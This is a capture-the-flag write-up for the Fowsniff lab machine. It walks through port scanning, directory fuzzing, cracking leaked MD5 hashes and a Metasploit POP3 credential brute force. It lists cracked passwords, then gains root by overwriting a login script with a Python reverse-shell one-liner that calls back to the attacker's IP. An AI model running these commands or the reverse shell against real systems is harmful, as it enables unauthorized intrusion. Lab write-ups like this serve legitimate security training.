## Target IP: `10.10.55.110`

---

### Environment Variables

```bash
export IP=10.10.55.110
export LIP=10.6.24.56
```

---

### Nmap Scan

```bash
sudo nmap -sC -sV -O -T4 $IP -oN nmap_results.txt
```

**Open Ports:**

| Port | Service | Version |
| --- | --- | --- |
| 22 | SSH | OpenSSH 7.2p2 |
| 80 | HTTP | Apache 2.4.18 |
| 110 | POP3 | Dovecot pop3d |
| 143 | IMAP | Dovecot imapd |

---

### Web Enumeration

Visited: `http://$IP`

→ Site for a company called "Fowsniff Corp"

Source code reveals:

```
Escape Velocity by HTML5 UP
html5up.net | @ajlkn
Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
```

---

### Directory Brute Force

```bash
ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/dirb/common.txt -c --recursion
```

**Discovered:**

- `/images` → just a few images
- `/assets` → directory listing

Inside `/assets/`:

```
css/
fonts/
js/
sass/
```

---

### Creds Discovery (Via GitHub)

Hint mentioned **leaked employee emails and password hashes** that were on Pastebin, but Pastebin is gone.

Instead, found them here:

https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt

**Found in file:**

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

---

### Preparing Hash List

Used Vim to strip emails and keep only hashes:

```
:%s/^[^:]*://
```

Resulting list:

```
8a28a94a588a95b80163709ab4313aa4
ae1644dac5b77c0cf51e0d26ad6d7e56
1dc352435fecca338acfd4be10984009
19f5af754c31f1e2651edde9250d69bb
90dc16d47114aa13671c697fd506cf26
a92b8a29ef1183192e3d35187e0cfabd
0e9588cb62f4b6f27e33d449e2ba0b3b
4d6e42f56e127803285a0a7649b5ab11
f7fd98d380735e859f8b2ffbbede5a7e
```

---

### Hash Cracking with CrackStation

Result:

```
mailcall
bilbo101
apples01
skyler22
scoobydoo2
carp4ever
orlando12
07011972
```

→ Missing one hash crack (no match)

Saved cracked passwords to `cracked_passwords.txt`

---

### Metasploit POP3 Brute Force

Started `msfconsole`

Used module:

```bash
use auxiliary/scanner/pop3/pop3_login
```

Originally considered:

```bash
set USER_FILE list_of_usernames.txt
set PASS_FILE cracked_passwords.txt
```

But switched to faster method:

```bash
set USERPASS_FILE userpass.txt
```

Contents of `userpass.txt`:

```
mauer mailcall
mustikka bilbo101
tegel apples01
baksteen skyler22
seina scoobydoo2
mursten carp4ever
parede orlando12
sciana 07011972
```

Launched:

```bash
set RHOSTS $IP
run
```

**Valid credentials found:**

```
seina:[REDACTED]
```

---

### POP3 Login with Netcat

```bash
nc $IP 110
```

Commands used:

```bash
user seina
pass [REDACTED]
list
retr 1
retr 2
```

**Email #2 included line:**

```
The temporary password for SSH is "[REDACTED]"
```

---

### SSH Access Attempts

Tried:

```bash
ssh seina@$IP
# → failed

ssh stone@$IP
# → failed
```

Checked names mentioned in other email: **devin, baksteen, skyler, aj**

**Success:**

```bash
ssh baksteen@$IP
# Password: [REDACTED]
```

---

### User Enumeration

```bash
sudo -l
# → baksteen may not run sudo

groups
# → users baksteen
```

Looked for files group-owned by "users":

```bash
find / -group baksteen -perm -g=x 2>/dev/null
# → nothing useful

find / -group users -perm -g=x 2>/dev/null
# → /opt/cube/cube.sh (stands out)
```

---

### Exploiting `/opt/cube/cube.sh`

Discovered this script runs at login (sets banner).

Replaced contents of `cube.sh` with Python reverse shell:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.24.56",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Started listener:

```bash
nc -lvnp 8080
```

Closed SSH session and logged in again:

```bash
ssh baksteen@$IP
```

**Root shell received via reverse shell**

---

### Root Flag

```bash
cd /root
cat root.txt
```
